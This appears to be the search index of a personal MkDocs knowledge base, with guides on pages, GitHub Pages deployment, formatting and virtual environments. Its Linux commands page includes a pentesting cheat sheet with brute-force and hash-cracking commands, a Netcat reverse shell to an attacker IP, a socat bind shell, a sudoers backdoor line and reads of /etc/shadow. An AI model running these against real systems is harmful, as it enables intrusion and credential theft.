{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Welcome to MkDocs","text":"<p>For full documentation visit mkdocs.org.</p>"},{"location":"#commands","title":"Commands","text":"<ul> <li><code>mkdocs new [dir-name]</code> - Create a new project.</li> <li><code>mkdocs serve</code> - Start the live-reloading docs server.</li> <li><code>mkdocs build</code> - Build the documentation site.</li> <li><code>mkdocs -h</code> - Print help message and exit.</li> </ul>"},{"location":"#project-layout","title":"Project layout","text":"<pre><code>mkdocs.yml    # The configuration file.\ndocs/\n    index.md  # The documentation homepage.\n    ...       # Other markdown pages, images and other files.\n</code></pre>"},{"location":"create/","title":"Creating MkDocs Pages &amp; Managing Navigation","text":""},{"location":"create/#introduction","title":"Introduction","text":"<p>MkDocs is a powerful static site generator designed for documentation projects. This guide covers how to create new MkDocs pages and manage site navigation using <code>mkdocs.yml</code>.</p>"},{"location":"create/#creating-a-new-mkdocs-page","title":"\ud83d\udd39 Creating a New MkDocs Page","text":"<p>Each page in MkDocs is a Markdown (**<code>.md</code>**********) file stored in the <code>docs/</code> directory.</p>"},{"location":"create/#steps-to-create-a-page","title":"Steps to Create a Page:","text":"<ol> <li>Navigate to the **<code>docs/</code>** folder:    <code>bash    cd docs/</code></li> <li>Create a new Markdown file:    <code>bash    touch my-new-page.md</code></li> <li>Edit the file using any text editor:    <code>bash    code my-new-page.md</code></li> <li>Add content inside <code>my-new-page.md</code>:    ```markdown    # My New Page</li> </ol> <p>Welcome to my new page in MkDocs!    ```</p>"},{"location":"create/#managing-navigation-in-mkdocsyml","title":"\ud83d\udd39 Managing Navigation in <code>mkdocs.yml</code>","text":"<p>Navigation is defined in <code>mkdocs.yml</code> under the <code>nav:</code> section.</p>"},{"location":"create/#example-structure","title":"Example Structure:","text":"<pre><code>site_name: My Documentation\n\nnav:\n  - Home: index.md\n  - Getting Started: getting-started.md\n  - Features:\n      - Page One: page-one.md\n      - Page Two: page-two.md\n  - About: about.md\n</code></pre>"},{"location":"create/#explanation","title":"Explanation:","text":"<ul> <li>Top-level items (e.g., <code>Home</code>, <code>Getting Started</code>, <code>About</code>) are direct links.</li> <li>Nested items under <code>Features</code> group related pages together.</li> <li>Each entry follows the format: <code>Page Title: filename.md</code>.</li> </ul>"},{"location":"create/#previewing-changes-locally","title":"\ud83d\udd39 Previewing Changes Locally","text":"<p>After adding pages or updating navigation, preview the changes using:</p> <pre><code>mkdocs serve\n</code></pre> <p>Visit <code>http://127.0.0.1:8000/</code> in your browser to see the live site.</p>"},{"location":"create/#deploying-the-site","title":"\ud83d\udd39 Deploying the Site","text":"<p>When ready, build and deploy the MkDocs site:</p> <pre><code>mkdocs build\nmkdocs gh-deploy\n</code></pre> <p>This will generate static files in the <code>site/</code> folder and deploy them to GitHub Pages if configured.</p>"},{"location":"create/#best-practices","title":"\ud83d\udd39 Best Practices","text":"<ul> <li>Keep file names lowercase and use <code>-</code> instead of spaces.</li> <li>Structure navigation logically for easy access.</li> <li>Use nested navigation for better organization.</li> <li>Regularly run <code>mkdocs serve</code> to preview changes before deployment.</li> </ul>"},{"location":"create/#conclusion","title":"Conclusion","text":"<p>Creating pages in MkDocs is simple, and navigation is controlled via <code>mkdocs.yml</code>. By following these best practices, you can build a well-organized documentation site with ease.</p>"},{"location":"github/","title":"Managing MkDocs with GitHub","text":""},{"location":"github/#introduction","title":"Introduction","text":"<p>Using GitHub for version control and deployment is an essential practice when managing MkDocs projects. This guide covers how to create a new repository, update documentation, and deploy it to GitHub Pages.</p>"},{"location":"github/#creating-a-new-github-repository","title":"\ud83d\udd39 Creating a New GitHub Repository","text":"<ol> <li>Go to GitHub and log in.</li> <li>Click on <code>+</code> (top-right) \u2192 <code>New repository</code>.</li> <li>Enter repository details:</li> <li>Repository name: <code>my-mkdocs-site</code></li> <li>Description (optional): \"Documentation for my project\"</li> <li>Choose Public or Private.</li> <li>Check Add a README (optional).</li> <li>Click <code>Create repository</code>.</li> </ol>"},{"location":"github/#cloning-the-repository","title":"Cloning the Repository","text":"<p>After creating the repository, clone it to your local machine:</p> <pre><code>git clone https://github.com/your-username/my-mkdocs-site.git\ncd my-mkdocs-site\n</code></pre>"},{"location":"github/#updating-mkdocs-and-pushing-to-github","title":"\ud83d\udd39 Updating MkDocs and Pushing to GitHub","text":"<p>When making changes to MkDocs documentation, follow these steps:</p> <ol> <li>Stage all changes:    <code>bash    git add .</code></li> <li>Commit the changes:    <code>bash    git commit -m \"Added my new page\"</code></li> <li>Push to GitHub:    <code>bash    git push origin main</code></li> <li>Deploy the site to GitHub Pages:    <code>bash    mkdocs gh-deploy</code></li> </ol> <p>This will build and deploy your MkDocs site to GitHub Pages.</p>"},{"location":"github/#configuring-github-pages","title":"\ud83d\udd39 Configuring GitHub Pages","text":"<p>Ensure that GitHub Pages is enabled for your repository:</p> <ol> <li>Go to your repository on GitHub.</li> <li>Navigate to Settings &gt; Pages.</li> <li>Under Branch, select <code>gh-pages</code>.</li> <li>Click Save.</li> <li>Your site will be available at:    <code>https://your-username.github.io/my-mkdocs-site/</code></li> </ol>"},{"location":"github/#best-practices","title":"\ud83d\udd39 Best Practices","text":"<ul> <li>Always commit meaningful messages (<code>git commit -m \"Updated navigation\"</code>).</li> <li>Regularly pull updates from the repository before making changes:   <code>bash   git pull origin main</code></li> <li>Check Git status to review changes before committing:   <code>bash   git status</code></li> </ul>"},{"location":"github/#conclusion","title":"Conclusion","text":"<p>Using GitHub for MkDocs makes it easy to manage documentation changes and deploy updates. By following these steps, you can keep your project well-organized and version-controlled.</p>"},{"location":"linux-commands/","title":"Linux Commands","text":""},{"location":"linux-commands/#basic-linux-commands","title":"Basic Linux Commands","text":""},{"location":"linux-commands/#system-information","title":"System Information","text":"<ul> <li><code>whoami</code> \u2013 Display the current user</li> <li><code>id</code> \u2013 Show user and group IDs</li> <li><code>uname -a</code> \u2013 Show system information</li> <li><code>uptime</code> \u2013 Display system uptime</li> <li><code>df -h</code> \u2013 Show disk usage</li> <li><code>du -sh *</code> \u2013 Show directory sizes</li> <li><code>free -m</code> \u2013 Show memory usage</li> <li><code>ps aux</code> \u2013 List running processes</li> <li><code>top</code> \u2013 Monitor system processes</li> <li><code>kill -9 &lt;PID&gt;</code> \u2013 Kill a process by PID</li> <li><code>crontab -l</code> \u2013 List scheduled cron jobs</li> <li><code>history</code> \u2013 Show command history</li> <li><code>echo $SHELL</code> \u2013 Show default shell</li> <li><code>lsb_release -a</code> \u2013 Show OS details</li> </ul>"},{"location":"linux-commands/#file-directory-management","title":"File &amp; Directory Management","text":"<ul> <li><code>ls -lah</code> \u2013 List files with details</li> <li><code>cd /path/to/directory</code> \u2013 Change directory</li> <li><code>pwd</code> \u2013 Print working directory</li> <li><code>mkdir newfolder</code> \u2013 Create a new folder</li> <li><code>rm -rf folder</code> \u2013 Delete a folder recursively</li> <li><code>cp file1 file2</code> \u2013 Copy files</li> <li><code>mv oldname newname</code> \u2013 Rename or move files</li> <li><code>find / -name \"*.conf\"</code> \u2013 Find config files</li> <li><code>grep -r \"password\" /etc/</code> \u2013 Search for passwords in files</li> <li><code>cat file.txt</code> \u2013 View file content</li> <li><code>less file.txt</code> \u2013 View file content with scrolling</li> </ul>"},{"location":"linux-commands/#user-permission-management","title":"User &amp; Permission Management","text":"<ul> <li><code>adduser username</code> \u2013 Add a new user</li> <li><code>passwd username</code> \u2013 Change user password</li> <li><code>su - username</code> \u2013 Switch user</li> <li><code>groups username</code> \u2013 Show user groups</li> <li><code>chmod 777 file</code> \u2013 Change file permissions</li> <li><code>chown user:group file</code> \u2013 Change file ownership</li> <li><code>sudo -l</code> \u2013 List sudo privileges</li> <li><code>visudo</code> \u2013 Edit sudoers file</li> </ul>"},{"location":"linux-commands/#networking-connectivity","title":"Networking &amp; Connectivity","text":"<ul> <li><code>ifconfig</code> or <code>ip a</code> \u2013 Show network interfaces</li> <li><code>ping -c 4 &lt;target&gt;</code> \u2013 Check host availability</li> <li><code>traceroute &lt;target&gt;</code> \u2013 Trace packet route</li> <li><code>netstat -tulnp</code> \u2013 Show open ports</li> <li><code>ss -tulnp</code> \u2013 Alternative to netstat</li> <li><code>arp -a</code> \u2013 Show ARP table</li> <li><code>nc -lvnp &lt;port&gt;</code> \u2013 Open a Netcat listener</li> <li><code>curl -I &lt;URL&gt;</code> \u2013 Get HTTP headers</li> <li><code>wget &lt;URL&gt;</code> \u2013 Download files</li> <li><code>scp user@host:/file /local/path</code> \u2013 Copy files via SSH</li> <li><code>rsync -avz user@host:/dir /local/dir</code> \u2013 Sync directories over SSH</li> </ul>"},{"location":"linux-commands/#hacking-pentesting-commands","title":"Hacking &amp; Pentesting Commands","text":""},{"location":"linux-commands/#reconnaissance-scanning","title":"Reconnaissance &amp; Scanning","text":"<ul> <li><code>nmap -sV -A &lt;target&gt;</code> \u2013 Scan open ports with service detection</li> <li><code>nmap -Pn -p- &lt;target&gt;</code> \u2013 Full port scan ignoring ping</li> <li><code>nmap --script=vuln &lt;target&gt;</code> \u2013 Scan for vulnerabilities</li> <li><code>nikto -h &lt;target&gt;</code> \u2013 Scan web servers for vulnerabilities</li> <li><code>whatweb &lt;URL&gt;</code> \u2013 Identify web technologies</li> <li><code>dnsenum &lt;domain&gt;</code> \u2013 Enumerate DNS records</li> <li><code>dig @8.8.8.8 &lt;domain&gt;</code> \u2013 Get DNS info</li> <li><code>whois &lt;domain&gt;</code> \u2013 Get domain registration details</li> <li><code>theHarvester -d &lt;domain&gt; -l 500 -b google</code> \u2013 Gather emails &amp; subdomains</li> <li><code>sublist3r -d &lt;domain&gt;</code> \u2013 Find subdomains</li> </ul>"},{"location":"linux-commands/#password-cracking-exploitation","title":"Password Cracking &amp; Exploitation","text":"<ul> <li><code>hydra -L users.txt -P passwords.txt &lt;service&gt;://&lt;target&gt;</code> \u2013 Brute-force login</li> <li><code>john --wordlist=rockyou.txt hash.txt</code> \u2013 Crack hashes with John</li> <li><code>hashcat -m 0 hash.txt rockyou.txt</code> \u2013 Crack hashes with Hashcat</li> <li><code>sqlmap -u &lt;URL&gt; --dbs</code> \u2013 Test SQL injection</li> <li><code>searchsploit &lt;keyword&gt;</code> \u2013 Find exploits in Exploit-DB</li> <li><code>msfconsole</code> \u2013 Open Metasploit Framework</li> <li><code>exploit/multi/handler</code> \u2013 Start Metasploit reverse shell listener</li> <li><code>evil-winrm -i &lt;target&gt; -u &lt;user&gt; -p &lt;password&gt;</code> \u2013 Exploit Windows via WinRM</li> <li><code>smbclient -L //&lt;target&gt;</code> \u2013 List SMB shares</li> <li><code>enum4linux -a &lt;target&gt;</code> \u2013 Enumerate Windows shares &amp; users</li> </ul>"},{"location":"linux-commands/#reverse-shell-privilege-escalation","title":"Reverse Shell &amp; Privilege Escalation","text":"<ul> <li><code>nc -e /bin/bash &lt;attacker-ip&gt; &lt;port&gt;</code> \u2013 Reverse shell (Netcat)</li> <li><code>python3 -c 'import pty; pty.spawn(\"/bin/bash\")'</code> \u2013 Upgrade shell to TTY</li> <li><code>echo 'user ALL=(ALL) NOPASSWD:ALL' &gt;&gt; /etc/sudoers</code> \u2013 Grant root access</li> <li><code>find / -perm -u=s -type f 2&gt;/dev/null</code> \u2013 Find SUID binaries</li> <li><code>sudo -l</code> \u2013 List sudo permissions</li> <li><code>getcap -r / 2&gt;/dev/null</code> \u2013 Find files with special capabilities</li> <li><code>linpeas.sh</code> \u2013 Automated privilege escalation scan</li> <li><code>pspy64</code> \u2013 Monitor running processes for privilege escalation</li> <li><code>gdb -q ./vulnerable</code> \u2013 Debug binaries for exploitation</li> <li><code>strings ./binary | grep password</code> \u2013 Find sensitive data in binaries</li> </ul>"},{"location":"linux-commands/#file-directory-manipulation","title":"File &amp; Directory Manipulation","text":"<ul> <li><code>tar -czf archive.tar.gz /path/to/files</code> \u2013 Compress files</li> <li><code>unzip archive.zip -d /path/to/extract/</code> \u2013 Extract files</li> <li><code>mount /dev/sdb1 /mnt/usb</code> \u2013 Mount USB drive</li> <li><code>dd if=/dev/sda of=/mnt/backup.img</code> \u2013 Create disk image</li> <li><code>cat /etc/passwd</code> \u2013 View system users</li> <li><code>cat /etc/shadow</code> \u2013 View password hashes (requires root)</li> </ul>"},{"location":"linux-commands/#miscellaneous-hacking-automation","title":"Miscellaneous Hacking &amp; Automation","text":"<ul> <li><code>socat TCP4-LISTEN:&lt;port&gt;,fork EXEC:/bin/bash</code> \u2013 Bind shell with Socat</li> <li><code>base64 -d &lt; file</code> \u2013 Decode Base64</li> <li><code>xxd -r -p hex.txt &gt; binary</code> \u2013 Convert hex to binary</li> <li><code>crunch 8 10 abc123 -o wordlist.txt</code> \u2013 Generate wordlists</li> <li><code>tmux</code> \u2013 Open a terminal multiplexer</li> <li><code>proxychains nmap -sT -Pn &lt;target&gt;</code> \u2013 Use proxies for scans</li> <li><code>torify curl &lt;URL&gt;</code> \u2013 Browse via Tor</li> <li><code>exiftool image.jpg</code> \u2013 Extract metadata from images</li> </ul>"},{"location":"mkdocs-formatting-guide/","title":"Formatting Guide","text":""},{"location":"mkdocs-formatting-guide/#mkdocs-formatting-guide","title":"MkDocs Formatting Guide","text":"<p>MkDocs is a static site generator for project documentation that uses Markdown. This guide covers the essential formatting and structuring tips for writing articles in MkDocs.</p>"},{"location":"mkdocs-formatting-guide/#basic-document-structure","title":"Basic Document Structure","text":"<p>MkDocs follows a simple hierarchy using Markdown headings:</p> <pre><code># Main Title (h1)\n## Subheading (h2)\n### Section (h3)\n#### Subsection (h4)\n</code></pre> <p>Example:</p> <pre><code># My MkDocs Knowledge Base\n\n## Networking Commands\n\n### Scanning Open Ports with Nmap\n```bash\nnmap -sV -A &lt;target&gt;\n</code></pre> <pre><code>\n---\n\n## Code Blocks\n\nFor adding code snippets, use **triple backticks** (` ``` `) with the language specified:\n\n```markdown\n```bash\nls -lah\n</code></pre> <pre><code>\nThis renders as:\n\n```bash\nls -lah\n</code></pre> <p>Alternatively, you can use four-space indentation, but backticks are preferred for syntax highlighting:</p> <pre><code>    ls -lah\n</code></pre>"},{"location":"mkdocs-formatting-guide/#lists-bullet-points","title":"Lists &amp; Bullet Points","text":"<p>MkDocs supports both unordered and ordered lists:</p>"},{"location":"mkdocs-formatting-guide/#unordered-list","title":"Unordered List:","text":"<pre><code>- Item 1\n- Item 2\n  - Subitem 2.1\n  - Subitem 2.2\n</code></pre>"},{"location":"mkdocs-formatting-guide/#ordered-list","title":"Ordered List:","text":"<pre><code>1. First item\n2. Second item\n   1. Sub-item\n   2. Sub-item\n</code></pre>"},{"location":"mkdocs-formatting-guide/#links-images","title":"Links &amp; Images","text":""},{"location":"mkdocs-formatting-guide/#adding-links","title":"Adding Links:","text":"<pre><code>[OpenAI](https://openai.com)\n</code></pre> <p>This renders as: OpenAI</p>"},{"location":"mkdocs-formatting-guide/#adding-images","title":"Adding Images:","text":"<pre><code>![Alt Text](https://example.com/image.png)\n</code></pre> <p>You can also specify image width in MkDocs using custom CSS.</p>"},{"location":"mkdocs-formatting-guide/#blockquotes-callouts","title":"Blockquotes &amp; Callouts","text":"<p>Blockquotes are used for emphasizing notes or warnings:</p> <pre><code>&gt; This is a blockquote. Use it for important notes.\n</code></pre> <p>To create callouts using extensions like <code>admonition</code>:</p> <pre><code>!!! note \"Important Note\"\n    This is a highlighted note.\n</code></pre>"},{"location":"mkdocs-formatting-guide/#tables","title":"Tables","text":"<p>Tables can be created using pipes (``):</p> <pre><code>| Command  | Description       |\n|----------|-----------------|\n| `ls`     | List directory contents |\n| `pwd`    | Print working directory |\n</code></pre> <p>This renders as:</p> Command Description <code>ls</code> List directory contents <code>pwd</code> Print working directory"},{"location":"mkdocs-formatting-guide/#customizing-mkdocs","title":"Customizing MkDocs","text":""},{"location":"mkdocs-formatting-guide/#configuring-mkdocsyml","title":"Configuring <code>mkdocs.yml</code>","text":"<p>Your `` defines the navigation and settings:</p> <pre><code>site_name: My Documentation\nnav:\n  - Home: index.md\n  - Guide: guide.md\ntheme:\n  name: material\n</code></pre>"},{"location":"mkdocs-formatting-guide/#running-the-local-server","title":"Running the Local Server","text":"<p>Start the MkDocs server locally to preview changes:</p> <pre><code>mkdocs serve\n</code></pre> <p>Visit <code>http://127.0.0.1:8000/</code> in your browser.</p>"},{"location":"mkdocs-formatting-guide/#extending-mkdocs","title":"Extending MkDocs","text":""},{"location":"mkdocs-formatting-guide/#installing-plugins","title":"Installing Plugins","text":"<p>You can extend MkDocs with plugins:</p> <pre><code>pip install mkdocs-material\n</code></pre> <p>Then add it to <code>mkdocs.yml</code>:</p> <pre><code>theme:\n  name: material\n</code></pre>"},{"location":"mkdocs-formatting-guide/#conclusion","title":"Conclusion","text":"<p>This guide covers the essentials for formatting articles in MkDocs, including headings, code blocks, lists, links, images, and tables. Keep your documentation structured, readable, and well-organized!</p>"},{"location":"venv/","title":"Setting Up a Virtual Environment for MkDocs","text":""},{"location":"venv/#introduction","title":"Introduction","text":"<p>Using a virtual environment (venv) for MkDocs ensures a clean, isolated workspace for documentation projects. This guide covers how to set up and manage a Python virtual environment for MkDocs.</p>"},{"location":"venv/#creating-a-virtual-environment","title":"\ud83d\udd39 Creating a Virtual Environment","text":"<p>To create a virtual environment named <code>mkdocs-venv</code>, run:</p> <pre><code>python3 -m venv mkdocs-venv\n</code></pre> <p>This will generate a virtual environment inside the <code>mkdocs-venv</code> directory.</p>"},{"location":"venv/#activating-the-virtual-environment","title":"\ud83d\udd39 Activating the Virtual Environment","text":"<p>After creating the virtual environment, activate it:</p> <pre><code>source mkdocs-venv/bin/activate\n</code></pre> <p>Once activated, your terminal prompt will change to indicate that the venv is active:</p> <pre><code>(mkdocs-venv) user@kali:~$\n</code></pre>"},{"location":"venv/#installing-mkdocs","title":"\ud83d\udd39 Installing MkDocs","text":"<p>With the virtual environment activated, install MkDocs:</p> <pre><code>pip install mkdocs\n</code></pre> <p>Verify the installation by checking the MkDocs version:</p> <pre><code>mkdocs --version\n</code></pre> <p>If the command returns a version number, MkDocs is successfully installed.</p>"},{"location":"venv/#deactivating-the-virtual-environment","title":"\ud83d\udd39 Deactivating the Virtual Environment","text":"<p>To exit the virtual environment, run:</p> <pre><code>deactivate\n</code></pre> <p>Your prompt should revert to the system default, indicating that the virtual environment is no longer active.</p>"},{"location":"venv/#best-practices","title":"\ud83d\udd39 Best Practices","text":"<ul> <li>Always activate the virtual environment before running MkDocs-related commands.</li> <li>Install additional MkDocs plugins and themes inside the virtual environment to avoid conflicts.</li> <li>Use <code>requirements.txt</code> to save dependencies for easy reinstallation:</li> </ul> <p><code>bash   pip freeze &gt; requirements.txt</code></p> <p>To reinstall dependencies later:</p> <p><code>bash   pip install -r requirements.txt</code></p>"},{"location":"venv/#conclusion","title":"Conclusion","text":"<p>Setting up a virtual environment for MkDocs helps maintain a clean Python workspace, preventing dependency conflicts. Following these steps ensures a smooth MkDocs experience.</p>"}]}